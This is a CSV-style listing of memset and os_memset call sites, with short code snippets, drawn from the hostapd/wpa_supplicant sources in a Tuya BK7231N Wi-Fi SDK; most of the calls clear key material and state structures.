2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"os_memset(capa, 0, sizeof(*capa));",120,1,"int wpa_driver_get_capa(void *priv, struct wpa_driver_capa *capa)
{
    os_memset(capa, 0, sizeof(*capa));

    capa->max_scan_ssids = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&ie, 0, sizeof(ie));",120,1,"		""Handshake from "" MACSTR "" (ver=%d)"", MAC2STR(src_addr), ver);

	os_memset(&ie, 0, sizeof(ie));

	if (sm->proto == WPA_PROTO_RSN) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->ptk.tk, 0, WPA_TK_MAX_LEN);",120,1,"
	/* TK is not needed anymore in supplicant */
	os_memset(sm->ptk.tk, 0, WPA_TK_MAX_LEN);
    sm->ptk.installed = 1;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(gtk_buf, 0, sizeof(gtk_buf));",120,1,"				""WPA: Failed to set GTK to the driver ""
				""(Group only)"");
			os_memset(gtk_buf, 0, sizeof(gtk_buf));
			return -1;
		}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&gd, 0, sizeof(gd));",120,1,"	 * GTK
	 */
	os_memset(&gd, 0, sizeof(gd));
	wpa_hexdump_key(MSG_DEBUG, ""RSN: received GTK in pairwise handshake"",
			gtk, gtk_len);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(ek, 0, sizeof(ek));",120,1,"		os_memcpy(gd->gtk, key_data, key_data_len);
		if (rc4_skip(ek, 32, 256, gd->gtk, key_data_len)) {
			os_memset(ek, 0, sizeof(ek));
			wpa_msg(sm->ctx->msg_ctx, MSG_ERROR,
				""WPA: RC4 failed"");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(key->key_mic, 0, mic_len);",120,1,"	os_memcpy(mic, key->key_mic, mic_len);
	if (sm->tptk_set) {
		os_memset(key->key_mic, 0, mic_len);
		wpa_eapol_key_mic(sm->tptk.kck, sm->tptk.kck_len, sm->key_mgmt,
				  ver, buf, len, key->key_mic);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->tptk, 0, sizeof(sm->tptk));",120,1,"			sm->ptk_set = 1;
			os_memcpy(&sm->ptk, &sm->tptk, sizeof(sm->ptk));
			os_memset(&sm->tptk, 0, sizeof(sm->tptk));
		}
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->rx_replay_counter, 0, WPA_REPLAY_COUNTER_LEN);",120,1,"		""WPA: Association event - clear replay counter"");
	os_memcpy(sm->bssid, bssid, ETH_ALEN);
	os_memset(sm->rx_replay_counter, 0, WPA_REPLAY_COUNTER_LEN);
	sm->rx_replay_counter_set = 0;
	sm->renew_snonce = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->ptk, 0, sizeof(sm->ptk));",120,1,"		wpa_dbg(sm->ctx->msg_ctx, MSG_DEBUG, ""WPA: Clear old PTK"");
		sm->ptk_set = 0;
		os_memset(&sm->ptk, 0, sizeof(sm->ptk));
		sm->tptk_set = 0;
		os_memset(&sm->tptk, 0, sizeof(sm->tptk));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->gtk, 0, sizeof(sm->gtk));",120,1,"		sm->tptk_set = 0;
		os_memset(&sm->tptk, 0, sizeof(sm->tptk));
        os_memset(&sm->gtk, 0, sizeof(sm->gtk));
        os_memset(&sm->gtk_wnm_sleep, 0, sizeof(sm->gtk_wnm_sleep));
#ifdef CONFIG_IEEE80211W
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->gtk_wnm_sleep, 0, sizeof(sm->gtk_wnm_sleep));",120,1,"		os_memset(&sm->tptk, 0, sizeof(sm->tptk));
        os_memset(&sm->gtk, 0, sizeof(sm->gtk));
        os_memset(&sm->gtk_wnm_sleep, 0, sizeof(sm->gtk_wnm_sleep));
#ifdef CONFIG_IEEE80211W
		os_memset(&sm->igtk, 0, sizeof(sm->igtk));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->igtk, 0, sizeof(sm->igtk));",120,1,"        os_memset(&sm->gtk_wnm_sleep, 0, sizeof(sm->gtk_wnm_sleep));
#ifdef CONFIG_IEEE80211W
		os_memset(&sm->igtk, 0, sizeof(sm->igtk));
        os_memset(&sm->igtk_wnm_sleep, 0, sizeof(sm->igtk_wnm_sleep));
#endif /* CONFIG_IEEE80211W */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(&sm->igtk_wnm_sleep, 0, sizeof(sm->igtk_wnm_sleep));",120,1,"#ifdef CONFIG_IEEE80211W
		os_memset(&sm->igtk, 0, sizeof(sm->igtk));
        os_memset(&sm->igtk_wnm_sleep, 0, sizeof(sm->igtk_wnm_sleep));
#endif /* CONFIG_IEEE80211W */
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->p2p_ip_addr, 0, sizeof(sm->p2p_ip_addr));",120,1,"
#ifdef CONFIG_P2P
	os_memset(sm->p2p_ip_addr, 0, sizeof(sm->p2p_ip_addr));
#endif /* CONFIG_P2P */
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->pmk, 0, PMK_LEN);",120,1,"
	sm->pmk_len = PMK_LEN;
	os_memset(sm->pmk, 0, PMK_LEN);
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->pmk, 0, sizeof(sm->pmk));",120,1,"	sm->ptk_set = 0;
	sm->tptk_set = 0;
	os_memset(sm->pmk, 0, sizeof(sm->pmk));
	os_memset(&sm->ptk, 0, sizeof(sm->ptk));
	os_memset(&sm->tptk, 0, sizeof(sm->tptk));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->xxkey, 0, sizeof(sm->xxkey));",120,1,"#endif /* CONFIG_IEEE80211W */
#ifdef CONFIG_IEEE80211R
	os_memset(sm->xxkey, 0, sizeof(sm->xxkey));
	os_memset(sm->pmk_r0, 0, sizeof(sm->pmk_r0));
	os_memset(sm->pmk_r1, 0, sizeof(sm->pmk_r1));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->pmk_r0, 0, sizeof(sm->pmk_r0));",120,1,"#ifdef CONFIG_IEEE80211R
	os_memset(sm->xxkey, 0, sizeof(sm->xxkey));
	os_memset(sm->pmk_r0, 0, sizeof(sm->pmk_r0));
	os_memset(sm->pmk_r1, 0, sizeof(sm->pmk_r1));
#endif /* CONFIG_IEEE80211R */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\rsn_supp\wpa.c,"os_memset(sm->pmk_r1, 0, sizeof(sm->pmk_r1));",120,1,"	os_memset(sm->xxkey, 0, sizeof(sm->xxkey));
	os_memset(sm->pmk_r0, 0, sizeof(sm->pmk_r0));
	os_memset(sm->pmk_r1, 0, sizeof(sm->pmk_r1));
#endif /* CONFIG_IEEE80211R */
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,"os_memset(res, 0, res_len);",120,1,"	size_t len = 0;

	os_memset(res, 0, res_len);

	if (src1) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,"os_memset(str, 0, len);",120,1,"	if (str) {
		size_t len = os_strlen(str);
		os_memset(str, 0, len);
		os_free(str);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\common.c,"os_memset(bin, 0, len);",120,1,"{
	if (bin) {
		os_memset(bin, 0, len);
		os_free(bin);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\eloop.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\eloop.c,"os_memset(&eloop, 0, sizeof(eloop));",120,1,"int eloop_init(void)
{
	os_memset(&eloop, 0, sizeof(eloop));
	dl_list_init(&eloop.timeout);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,"os_memset(nbuf + buf->used, 0, add_len);",120,1,"			if (nbuf == NULL)
				return -1;
			os_memset(nbuf + buf->used, 0, add_len);
			buf->buf = nbuf;
		} else {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,"os_memset(wpabuf_mhead(buf), 0, wpabuf_len(buf));",120,1,"{
	if (buf) {
		os_memset(wpabuf_mhead(buf), 0, wpabuf_len(buf));
		wpabuf_free(buf);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\utils\wpabuf.c,"os_memset(wpabuf_put(ret, len - blen), 0, len - blen);",120,1,"	ret = wpabuf_alloc(len);
	if (ret) {
		os_memset(wpabuf_put(ret, len - blen), 0, len - blen);
		wpabuf_put_buf(ret, buf);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\bss.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\bss.c,"os_memset(bss->hessid, 0, ETH_ALEN);",120,1,"	const u8 *ie = wpa_bss_get_ie(bss, WLAN_EID_INTERWORKING);
	if (ie == NULL || (ie[1] != 7 && ie[1] != 9)) {
		os_memset(bss->hessid, 0, ETH_ALEN);
		return;
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\config.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\config.c,"os_memset(ssid->go_p2p_dev_addr, 0, ETH_ALEN);",120,1,"	if (value[0] == '\0' || os_strcmp(value, ""\""\"""") == 0 ||
	    os_strcmp(value, ""any"") == 0) {
		os_memset(ssid->go_p2p_dev_addr, 0, ETH_ALEN);
		wpa_printf(MSG_MSGDUMP, ""GO P2P Device Address any"");
		return 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\config_none.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\config_none.c,"os_memset(&ssid->psk, 0, sizeof(ssid->psk));",120,1,"	{
		bk_printf(""Skip PSK caculation if SSID and passphrase are same \n"");
		os_memset(&ssid->psk, 0, sizeof(ssid->psk));
		os_strcpy(ssid->psk, bssid_info.psk);
		ssid->psk_set = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\events.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\events.c,"os_memset(wpa_s->bssid, 0, ETH_ALEN);",120,1,"	wpa_supplicant_set_state(wpa_s, WPA_DISCONNECTED);
	bssid_changed = !is_zero_ether_addr(wpa_s->bssid);
	os_memset(wpa_s->bssid, 0, ETH_ALEN);
	os_memset(wpa_s->pending_bssid, 0, ETH_ALEN);
	sme_clear_on_disassoc(wpa_s);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\events.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\events.c,"os_memset(wpa_s->pending_bssid, 0, ETH_ALEN);",120,1,"	bssid_changed = !is_zero_ether_addr(wpa_s->bssid);
	os_memset(wpa_s->bssid, 0, ETH_ALEN);
	os_memset(wpa_s->pending_bssid, 0, ETH_ALEN);
	sme_clear_on_disassoc(wpa_s);
	wpa_s->current_bss = NULL;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\main_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\main_supplicant.c,"memset(psk, 0, 32);",120,1,"        return -1;
    }
    memset(psk, 0, 32);
    conf = wpa_global_ptr->ifaces->conf;
    memcpy(psk, conf->ssid->psk, 32);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wmm_ac.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wmm_ac.c,"os_memset(wpa_s->tspecs, 0, sizeof(wpa_s->tspecs));",120,1,"	}

	os_memset(wpa_s->tspecs, 0, sizeof(wpa_s->tspecs));
	wpa_s->wmm_ac_last_dialog_token = 0;
	wpa_s->addts_request = NULL;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpas_glue.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpas_glue.c,"os_memset(hdr + 1, 0, data_len);",120,1,"		os_memcpy(hdr + 1, data, data_len);
	else
		os_memset(hdr + 1, 0, data_len);

	if (data_pos)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpas_glue.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpas_glue.c,"os_memset(&conf, 0, sizeof(conf));",120,1,"	struct rsn_supp_config conf;
	if (ssid) {
		os_memset(&conf, 0, sizeof(conf));
		conf.network_ctx = ssid;
		conf.peerkey_enabled = ssid->peerkey;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(key, 0, sizeof(key));",120,1,"	 * and RX from each STA.. */
	ret = wpa_drv_set_key(wpa_s, alg, NULL, 0, 1, seq, 6, key, keylen);
	os_memset(key, 0, sizeof(key));
	return ret;
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&eapol_conf, 0, sizeof(eapol_conf));",120,1,"		eapol_sm_notify_portControl(wpa_s->eapol, Auto);

	os_memset(&eapol_conf, 0, sizeof(eapol_conf));
	if (wpa_s->key_mgmt == WPA_KEY_MGMT_IEEE8021X_NO_WPA) {
		eapol_conf.accept_802_1x_keys = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(psk, 0, sizeof(psk));",120,1,"			wpa_sm_set_pmk(wpa_s->wpa, psk, PMK_LEN, NULL);
			psk_set = 1;
			os_memset(psk, 0, sizeof(psk));
		}
#endif /* CONFIG_NO_PBKDF2 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(wpa_s->p2p_ip_addr_info, 0, sizeof(wpa_s->p2p_ip_addr_info));",120,1,"	}

	os_memset(wpa_s->p2p_ip_addr_info, 0, sizeof(wpa_s->p2p_ip_addr_info));
#endif /* CONFIG_P2P */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&htcaps, 0, sizeof(htcaps));",120,1,"
#ifdef CONFIG_HT_OVERRIDES
	os_memset(&htcaps, 0, sizeof(htcaps));
	os_memset(&htcaps_mask, 0, sizeof(htcaps_mask));
	params.htcaps = (u8 *) &htcaps;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&htcaps_mask, 0, sizeof(htcaps_mask));",120,1,"#ifdef CONFIG_HT_OVERRIDES
	os_memset(&htcaps, 0, sizeof(htcaps));
	os_memset(&htcaps_mask, 0, sizeof(htcaps_mask));
	params.htcaps = (u8 *) &htcaps;
	params.htcaps_mask = (u8 *) &htcaps_mask;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&vhtcaps, 0, sizeof(vhtcaps));",120,1,"#endif /* CONFIG_HT_OVERRIDES */
#ifdef CONFIG_VHT_OVERRIDES
	os_memset(&vhtcaps, 0, sizeof(vhtcaps));
	os_memset(&vhtcaps_mask, 0, sizeof(vhtcaps_mask));
	params.vhtcaps = &vhtcaps;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&vhtcaps_mask, 0, sizeof(vhtcaps_mask));",120,1,"#ifdef CONFIG_VHT_OVERRIDES
	os_memset(&vhtcaps, 0, sizeof(vhtcaps));
	os_memset(&vhtcaps_mask, 0, sizeof(vhtcaps_mask));
	params.vhtcaps = &vhtcaps;
	params.vhtcaps_mask = &vhtcaps_mask;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&htcaps->supported_mcs_set, 0, IEEE80211_HT_MCS_MASK_LEN);",120,1,"
	/* This is what we are setting in the kernel */
	os_memset(&htcaps->supported_mcs_set, 0, IEEE80211_HT_MCS_MASK_LEN);

	wpa_msg(wpa_s, MSG_DEBUG, ""set_htcap, ht_mcs -:%s:-"", ht_mcs);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(freqs_data, 0, sizeof(struct wpa_used_freq_data) * len);",120,1,"	wpa_dbg(wpa_s, MSG_DEBUG,
		""Determining shared radio frequencies (max len %u)"", len);
	os_memset(freqs_data, 0, sizeof(struct wpa_used_freq_data) * len);

	dl_list_for_each(ifs, &wpa_s->radio->ifaces, struct wpa_supplicant,
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(freq_array, 0, sizeof(int) * len);",120,1,"	int num, i;

	os_memset(freq_array, 0, sizeof(int) * len);

	freqs_data = os_calloc(len, sizeof(struct wpa_used_freq_data));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\wpa_supplicant\wpa_supplicant.c,"os_memset(&report, 0, sizeof(report));",120,1,"	}

	os_memset(&report, 0, sizeof(report));
	report.tpc.eid = WLAN_EID_TPC_REPORT;
